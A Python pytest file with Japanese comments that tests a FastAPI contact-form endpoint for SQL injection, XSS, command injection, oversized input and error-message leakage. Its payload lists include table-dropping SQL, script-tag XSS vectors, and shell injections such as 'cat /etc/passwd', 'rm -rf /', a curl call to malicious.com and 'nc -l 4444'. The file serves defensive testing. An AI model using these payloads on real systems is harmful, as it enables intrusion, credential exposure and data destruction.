"""
セキュリティペネトレーションテスト
"""

import pytest
from fastapi.testclient import TestClient
from app.main import app

client = TestClient(app)


class TestSecurity:
    """セキュリティテスト"""
    
    def test_sql_injection_protection(self):
        """SQLインジェクション攻撃に対する保護テスト"""
        # SQLインジェクション攻撃パターン
        malicious_payloads = [
            "'; DROP TABLE contacts; --",
            "' OR '1'='1",
            "'; SELECT * FROM admins; --",
            "' UNION SELECT password FROM admins --",
            "admin'--",
            "admin' /*",
            "' or 1=1#",
            "' or 1=1--",
            "' or 1=1/*"
        ]
        
        for payload in malicious_payloads:
            # 問い合わせフォームでのSQLインジェクション試行
            contact_data = {
                "name": payload,
                "email": f"test@example.com",
                "message": payload,
                "lesson_type": "trial",
                "preferred_contact": "email"
            }
            
            response = client.post("/api/contacts", json=contact_data)
            
            # SQLインジェクションが成功していないことを確認
            # 正常処理（200）またはバリデーションエラー（422）であることを確認
            assert response.status_code in [200, 422], f"SQLインジェクション攻撃が検出されませんでした: {payload}"
            
            # レスポンスにSQLエラーメッセージが含まれていないことを確認
            response_text = response.text.lower()
            sql_error_keywords = ["sql", "syntax", "mysql", "postgresql", "database", "table"]
            
            for keyword in sql_error_keywords:
                assert keyword not in response_text, f"SQLエラーメッセージが露出しています: {keyword}"
    
    def test_xss_protection(self):
        """XSS攻撃に対する保護テスト"""
        # XSS攻撃パターン
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "';alert('XSS');//",
            "\"><script>alert('XSS')</script>"
        ]
        
        for payload in xss_payloads:
            contact_data = {
                "name": payload,
                "email": "test@example.com",
                "message": payload,
                "lesson_type": "trial",
                "preferred_contact": "email"
            }
            
            response = client.post("/api/contacts", json=contact_data)
            
            # XSSペイロードが適切に処理されることを確認
            assert response.status_code in [200, 422], f"XSS攻撃が適切に処理されませんでした: {payload}"
            
            # レスポンスにスクリプトタグが含まれていないことを確認
            response_text = response.text
            assert "<script>" not in response_text, "XSSペイロードがサニタイズされていません"
            assert "javascript:" not in response_text, "JavaScriptプロトコルがサニタイズされていません"
    
    def test_command_injection_protection(self):
        """コマンドインジェクション攻撃に対する保護テスト"""
        # コマンドインジェクション攻撃パターン
        command_payloads = [
            "; ls -la",
            "&& cat /etc/passwd",
            "| whoami",
            "`id`",
            "$(whoami)",
            "; rm -rf /",
            "&& curl http://malicious.com",
            "| nc -l 4444"
        ]
        
        for payload in command_payloads:
            contact_data = {
                "name": f"test{payload}",
                "email": "test@example.com",
                "message": f"message{payload}",
                "lesson_type": "trial",
                "preferred_contact": "email"
            }
            
            response = client.post("/api/contacts", json=contact_data)
            
            # コマンドインジェクションが成功していないことを確認
            assert response.status_code in [200, 422], f"コマンドインジェクション攻撃が検出されませんでした: {payload}"
    
    def test_input_validation_security(self):
        """入力値検証によるセキュリティテスト"""
        # 異常に長い入力値
        long_string = "A" * 10000
        
        invalid_inputs = [
            {
                "name": long_string,
                "email": "test@example.com",
                "message": "test"
            },
            {
                "name": "test",
                "email": long_string + "@example.com",
                "message": "test"
            },
            {
                "name": "test",
                "email": "test@example.com",
                "message": long_string
            }
        ]
        
        for invalid_input in invalid_inputs:
            response = client.post("/api/contacts", json=invalid_input)
            
            # 長すぎる入力は正常に処理されるか、適切にバリデーションされることを確認
            assert response.status_code in [200, 400, 422], f"異常な入力が適切に処理されませんでした: {invalid_input}"
    
    def test_information_disclosure_prevention(self):
        """情報漏洩防止テスト"""
        # 存在しないエンドポイントへのアクセス
        response = client.get("/api/nonexistent/endpoint")
        
        # 404エラーで適切に処理されることを確認
        assert response.status_code == 404, "存在しないエンドポイントが不適切に処理されました"
        
        # エラーレスポンスに機密情報が含まれていないことを確認
        response_text = response.text.lower()
        sensitive_keywords = ["password", "secret", "key", "token", "database", "internal"]
        
        for keyword in sensitive_keywords:
            assert keyword not in response_text, f"エラーレスポンスに機密情報が含まれています: {keyword}"